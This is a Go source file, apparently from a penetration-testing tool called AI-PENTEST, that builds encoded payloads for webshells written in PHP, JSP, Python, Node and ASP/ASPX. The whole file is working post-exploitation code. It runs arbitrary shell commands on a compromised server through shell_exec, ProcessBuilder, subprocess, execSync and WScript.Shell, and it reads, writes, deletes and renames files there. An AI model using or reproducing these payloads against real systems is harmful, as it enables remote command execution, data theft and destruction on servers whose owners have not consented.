package webshell

// payloads.go — 各脚本语言的 payload 构造（移植自 AI-PENTEST webshell/payloads.py）。
// 协议：参数全部 base64 后填入模板（@CMD@/@CWD@/@PATH@/@CONTENT@ 等占位符），
// 服务端 eval 后输出以 __WS_CWD__ / __WS_END__ / __WS_PONG__ 标记包裹。

import (
	"encoding/base64"
	"fmt"
	"strings"
)

const (
	CWDMarker  = "__WS_CWD__"
	EndMarker  = "__WS_END__"
	PongMarker = "__WS_PONG__"
)

func b64s(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

// build 填充模板占位符。值为空时对应占位符替换为空串。
func build(tpl string, kv ...string) string {
	if len(kv)%2 != 0 {
		panic("build: odd kv")
	}
	r := make([]string, 0, len(kv)*2)
	for i := 0; i < len(kv); i += 2 {
		r = append(r, kv[i], kv[i+1])
	}
	return strings.NewReplacer(r...).Replace(tpl)
}

// ---------- PHP ----------

const phpTest = "\necho \"@NONCE\" . bin2hex(random_bytes(4)) . \"__\";\necho \"" + EndMarker + "\";\n"

func phpExec(cmd, cwd string) string {
	return build("\n$cmd = base64_decode(\"@CMD@\");\n$cwd = base64_decode(\"@CWD@\");\n"+
		"if ($cwd && is_dir($cwd)) chdir($cwd);\n"+
		"$out = shell_exec($cmd . \" 2>&1\");\necho $out;\n"+
		"echo \"\\n"+CWDMarker+"\" . getcwd() . \"__"+EndMarker+"\";\n",
		"@CMD@", b64s(cmd), "@CWD@", b64s(cwd))
}

func phpList(path string) string {
	return build("\n$p = base64_decode(\"@PATH@\");\n"+
		"$rp = @realpath($p);\nif ($rp !== false) $p = $rp;\n"+
		"$files = [];\nforeach (scandir($p) as $f) {\n"+
		"    if ($f === '.') continue;\n"+
		"    $fp = $p . DIRECTORY_SEPARATOR . $f;\n"+
		"    $st = @lstat($fp);\n"+
		"    $files[] = ['name' => $f, 'size' => $st['size'] ?? 0, 'is_dir' => is_dir($fp), 'mtime' => $st['mtime'] ?? 0];\n"+
		"}\necho json_encode($files);\necho \""+EndMarker+"\";\n",
		"@PATH@", b64s(path))
}

func phpRead(path string) string {
	return build("\n$p = base64_decode(\"@PATH@\");\n"+
		"$data = @file_get_contents($p);\n"+
		"if ($data === false) { echo \"ERROR: cannot read\"; exit; }\n"+
		"echo base64_encode($data);\necho \""+EndMarker+"\";\n",
		"@PATH@", b64s(path))
}

func phpWrite(path, content string) string {
	return build("\n$p = base64_decode(\"@PATH@\");\n$c = base64_decode(\"@CONTENT@\");\n"+
		"$r = file_put_contents($p, $c);\n"+
		"echo $r === false ? \"ERROR\" : \"OK\";\necho \""+EndMarker+"\";\n",
		"@PATH@", b64s(path), "@CONTENT@", b64s(content))
}

func phpWriteBin(path, b64Data string) string {
	return build("\n$p = base64_decode(\"@PATH@\");\n$c = base64_decode(\"@B64@\");\n"+
		"$r = file_put_contents($p, $c);\n"+
		"echo $r === false ? \"ERROR\" : \"OK\";\necho \""+EndMarker+"\";\n",
		"@PATH@", b64s(path), "@B64@", b64Data)
}

func phpDelete(path string) string {
	return build("\n$p = base64_decode(\"@PATH@\");\n"+
		"function rrmdir($d){ if(is_dir($d)){ foreach(scandir($d) as $f){ if($f==='.'||$f==='..')continue; $f=$d.DIRECTORY_SEPARATOR.$f; is_dir($f)?rrmdir($f):@unlink($f);} @rmdir($d);} else @unlink($d); }\n"+
		"echo rrmdir($p) === null ? \"OK\" : \"OK\";\necho \""+EndMarker+"\";\n",
		"@PATH@", b64s(path))
}

func phpRename(oldPath, newPath string) string {
	return build("\n$o = base64_decode(\"@OLD@\");\n$n = base64_decode(\"@NEW@\");\n"+
		"echo @rename($o, $n) ? \"OK\" : \"ERROR\";\necho \""+EndMarker+"\";\n",
		"@OLD@", b64s(oldPath), "@NEW@", b64s(newPath))
}

func phpMkdir(path string) string {
	return build("\n$p = base64_decode(\"@PATH@\");\n"+
		"echo @mkdir($p, 0777, true) ? \"OK\" : \"ERROR\";\necho \""+EndMarker+"\";\n",
		"@PATH@", b64s(path))
}

// ---------- JSP（Nashorn JS） ----------

const jspTest = "print(\"" + PongMarker + "\" + String(java.util.UUID.randomUUID().toString().substring(0,8)) + \"__\");\nprint(\"" + EndMarker + "\");"

func jspExec(cmd, cwd string) string {
	return build(`var cmdB64 = "@CMD@";
var cwdB64 = "@CWD@";
var Base64 = java.util.Base64;
var cmd = new java.lang.String(Base64.getDecoder().decode(cmdB64));
var cwd = new java.lang.String(Base64.getDecoder().decode(cwdB64));
var pb = new java.lang.ProcessBuilder(java.util.Arrays.asList("sh", "-c", cmd));
if (cwd.length() > 0) pb.directory(new java.io.File(cwd));
pb.redirectErrorStream(true);
var p = pb.start();
var is = p.getInputStream();
var out = "";
var b;
while ((b = is.read()) != -1) out += String.fromCharCode(b);
p.waitFor();
print(out);
print("\n`+CWDMarker+`" + (cwd.length() > 0 ? cwd : new java.io.File(".").getAbsolutePath()) + "__`+EndMarker+`");`,
		"@CMD@", b64s(cmd), "@CWD@", b64s(cwd))
}

func jspList(path string) string {
	return build(`var Base64 = java.util.Base64;
var p = new java.io.File(new java.lang.String(Base64.getDecoder().decode("@PATH@")));
var files = [];
var list = p.listFiles();
if (list != null) {
    for (var i = 0; i < list.length; i++) {
        var f = list[i];
        files.push({name: f.getName(), size: f.length(), is_dir: f.isDirectory(), mtime: f.lastModified()});
    }
}
print(JSON.stringify(files));
print("`+EndMarker+`");`, "@PATH@", b64s(path))
}

func jspRead(path string) string {
	return build(`var Base64 = java.util.Base64;
var p = new java.io.File(new java.lang.String(Base64.getDecoder().decode("@PATH@")));
if (!p.exists() || !p.canRead()) { print("ERROR: cannot read"); print("`+EndMarker+`"); }
else {
    var bytes = java.nio.file.Files.readAllBytes(p.toPath());
    print(Base64.getEncoder().encodeToString(bytes));
    print("`+EndMarker+`");
}`, "@PATH@", b64s(path))
}

func jspWrite(path, content string) string {
	return build(`var Base64 = java.util.Base64;
var p = new java.io.File(new java.lang.String(Base64.getDecoder().decode("@PATH@")));
var c = Base64.getDecoder().decode("@CONTENT@");
try {
    java.nio.file.Files.write(p.toPath(), c);
    print("OK");
} catch (e) {
    print("ERROR: " + e);
}
print("`+EndMarker+`");`, "@PATH@", b64s(path), "@CONTENT@", b64s(content))
}

// ---------- Python ----------

const pyTest = "OUTPUT = \"" + PongMarker + "\" + __import__(\"secrets\").token_hex(4) + \"__\" + \"" + EndMarker + "\""

func pyExec(cmd, cwd string) string {
	return build(`import base64, subprocess, os
cmd = base64.b64decode("@CMD@").decode()
cwd = base64.b64decode("@CWD@").decode()
if cwd and os.path.isdir(cwd):
    os.chdir(cwd)
try:
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
    out = (r.stdout or "") + (r.stderr or "")
except Exception as e:
    out = "ERROR: " + str(e)
OUTPUT = out + "\n`+CWDMarker+`" + os.getcwd() + "__`+EndMarker+`"`,
		"@CMD@", b64s(cmd), "@CWD@", b64s(cwd))
}

func pyList(path string) string {
	return build(`import base64, os, json
p = base64.b64decode("@PATH@").decode()
files = []
for name in os.listdir(p):
    fp = os.path.join(p, name)
    try:
        st = os.stat(fp)
        files.append({"name": name, "size": st.st_size, "is_dir": os.path.isdir(fp), "mtime": int(st.st_mtime)})
    except Exception:
        pass
OUTPUT = json.dumps(files) + "`+EndMarker+`"`, "@PATH@", b64s(path))
}

func pyRead(path string) string {
	return build(`import base64
p = base64.b64decode("@PATH@").decode()
try:
    with open(p, "rb") as f:
        OUTPUT = base64.b64encode(f.read()).decode() + "`+EndMarker+`"
except Exception as e:
    OUTPUT = "ERROR: " + str(e) + "`+EndMarker+`"`, "@PATH@", b64s(path))
}

func pyWrite(path, content string) string {
	return build(`import base64
p = base64.b64decode("@PATH@").decode()
c = base64.b64decode("@CONTENT@")
try:
    with open(p, "wb") as f:
        f.write(c)
    OUTPUT = "OK`+EndMarker+`"
except Exception as e:
    OUTPUT = "ERROR: " + str(e) + "`+EndMarker+`"`,
		"@PATH@", b64s(path), "@CONTENT@", b64s(content))
}

func pyDelete(path string) string {
	return build(`import base64, os, shutil
p = base64.b64decode("@PATH@").decode()
try:
    if os.path.isdir(p):
        shutil.rmtree(p)
    else:
        os.remove(p)
    OUTPUT = "OK`+EndMarker+`"
except Exception as e:
    OUTPUT = "ERROR: " + str(e) + "`+EndMarker+`"`, "@PATH@", b64s(path))
}

func pyMkdir(path string) string {
	return build(`import base64, os
p = base64.b64decode("@PATH@").decode()
try:
    os.makedirs(p, exist_ok=True)
    OUTPUT = "OK`+EndMarker+`"
except Exception as e:
    OUTPUT = "ERROR: " + str(e) + "`+EndMarker+`"`, "@PATH@", b64s(path))
}

// ---------- Node ----------

const nodeTest = "console.log(\"" + PongMarker + "\" + Math.random().toString(36).substring(2, 10) + \"__\");\nconsole.log(\"" + EndMarker + "\");"

func nodeExec(cmd, cwd string) string {
	return build(`const cmdB64 = "@CMD@";
const cwdB64 = "@CWD@";
const cmd = Buffer.from(cmdB64, "base64").toString("utf-8");
const cwd = Buffer.from(cwdB64, "base64").toString("utf-8");
const { execSync } = require("child_process");
try {
    const opts = { stdio: ["ignore", "pipe", "pipe"] };
    if (cwd) opts.cwd = cwd;
    const out = execSync(cmd, opts);
    process.stdout.write(out);
} catch (e) {
    process.stdout.write((e.stdout || "") + (e.stderr || "") + "\nERR: " + e.message);
}
const curCwd = process.cwd();
process.stdout.write("\n`+CWDMarker+`" + curCwd + "__`+EndMarker+`");`,
		"@CMD@", b64s(cmd), "@CWD@", b64s(cwd))
}

func nodeList(path string) string {
	return build(`const p = Buffer.from("@PATH@", "base64").toString("utf-8");
const fs = require("fs");
try {
    const files = fs.readdirSync(p).map(name => {
        const fp = require("path").join(p, name);
        const st = fs.statSync(fp);
        return {name, size: st.size, is_dir: st.isDirectory(), mtime: Math.floor(st.mtimeMs)};
    });
    process.stdout.write(JSON.stringify(files));
} catch (e) {
    process.stdout.write("ERROR: " + e.message);
}
process.stdout.write("`+EndMarker+`");`, "@PATH@", b64s(path))
}

func nodeRead(path string) string {
	return build(`const p = Buffer.from("@PATH@", "base64").toString("utf-8");
const fs = require("fs");
try {
    const data = fs.readFileSync(p);
    process.stdout.write(data.toString("base64"));
} catch (e) {
    process.stdout.write("ERROR: " + e.message);
}
process.stdout.write("`+EndMarker+`");`, "@PATH@", b64s(path))
}

func nodeWrite(path, content string) string {
	return build(`const p = Buffer.from("@PATH@", "base64").toString("utf-8");
const c = Buffer.from("@CONTENT@", "base64");
try {
    fs.writeFileSync(p, c);
    process.stdout.write("OK");
} catch (e) {
    process.stdout.write("ERROR: " + e.message);
}
process.stdout.write("`+EndMarker+`");`, "@PATH@", b64s(path), "@CONTENT@", b64s(content))
}

// ---------- ASP / ASPX（受限：exec 为主） ----------

func aspExec(cmd string) string {
	return build(`Dim cmdB64, xml, node, cmd
cmdB64 = "@CMD@"
Set xml = CreateObject("MSXML2.DOMDocument")
Set node = xml.createElement("b64")
node.dataType = "bin.base64"
node.text = cmdB64
Dim bs: bs = node.nodeTypedValue
Dim o: Set o = CreateObject("ADODB.Stream")
o.Type = 1: o.Open: o.Write bs: o.Position = 0
o.Type = 2: o.Charset = "utf-8"
cmd = o.ReadText()
Dim shell: Set shell = CreateObject("WScript.Shell")
Dim exec: Set exec = shell.Exec("cmd.exe /c " & cmd)
Response.Write exec.StdOut.ReadAll()
Response.Write exec.StdErr.ReadAll()
Response.Write "`+EndMarker+`"`, "@CMD@", b64s(cmd))
}

// aspxExec ASPX shell 内部直接 Process.Start(cmd /c body)，body 就是命令本身。
func aspxExec(cmd, cwd string) string {
	if cwd != "" {
		return fmt.Sprintf("cd /d %q && %s", cwd, cmd)
	}
	return cmd
}

// ---------- 分发 ----------

// SupportedOps 返回脚本类型支持的操作列表（form-cmd/asp/aspx 仅有 exec）。
func SupportedOps(scriptType string) []string {
	switch scriptType {
	case "php":
		return []string{"test", "exec", "list", "read", "write", "write_bin", "delete", "rename", "mkdir"}
	case "jsp", "jspx":
		return []string{"test", "exec", "list", "read", "write"}
	case "py":
		return []string{"test", "exec", "list", "read", "write", "delete", "mkdir"}
	case "node":
		return []string{"test", "exec", "list", "read", "write"}
	case "asp", "aspx":
		return []string{"exec"}
	}
	return nil
}

// BuildPayload 构造一次调用的 payload 代码。
func BuildPayload(scriptType, op string, params P) (string, error) {
	switch scriptType {
	case "php":
		switch op {
		case "test":
			return strings.ReplaceAll(phpTest, "@NONCE", PongMarker), nil
		case "exec":
			return phpExec(params.Cmd, params.Cwd), nil
		case "list":
			return phpList(params.Path), nil
		case "read":
			return phpRead(params.Path), nil
		case "write", "write_bin":
			if params.B64Data != "" {
				return phpWriteBin(params.Path, params.B64Data), nil
			}
			return phpWrite(params.Path, params.Content), nil
		case "delete":
			return phpDelete(params.Path), nil
		case "rename":
			return phpRename(params.Path, params.NewPath), nil
		case "mkdir":
			return phpMkdir(params.Path), nil
		}
	case "jsp", "jspx":
		switch op {
		case "test":
			return jspTest, nil
		case "exec":
			return jspExec(params.Cmd, params.Cwd), nil
		case "list":
			return jspList(params.Path), nil
		case "read":
			return jspRead(params.Path), nil
		case "write", "write_bin":
			return jspWrite(params.Path, params.Content), nil
		}
	case "py":
		switch op {
		case "test":
			return pyTest, nil
		case "exec":
			return pyExec(params.Cmd, params.Cwd), nil
		case "list":
			return pyList(params.Path), nil
		case "read":
			return pyRead(params.Path), nil
		case "write", "write_bin":
			return pyWrite(params.Path, params.Content), nil
		case "delete":
			return pyDelete(params.Path), nil
		case "mkdir":
			return pyMkdir(params.Path), nil
		}
	case "node":
		switch op {
		case "test":
			return nodeTest, nil
		case "exec":
			return nodeExec(params.Cmd, params.Cwd), nil
		case "list":
			return nodeList(params.Path), nil
		case "read":
			return nodeRead(params.Path), nil
		case "write", "write_bin":
			return nodeWrite(params.Path, params.Content), nil
		}
	case "asp":
		if op == "exec" {
			return aspExec(params.Cmd), nil
		}
	case "aspx":
		if op == "exec" {
			return aspxExec(params.Cmd, params.Cwd), nil
		}
	}
	return "", fmt.Errorf("%s 不支持操作 %s（支持: %v）", scriptType, op, SupportedOps(scriptType))
}

// P payload 参数集合。
type P struct {
	Cmd     string
	Cwd     string
	Path    string
	NewPath string
	Content string
	B64Data string
}
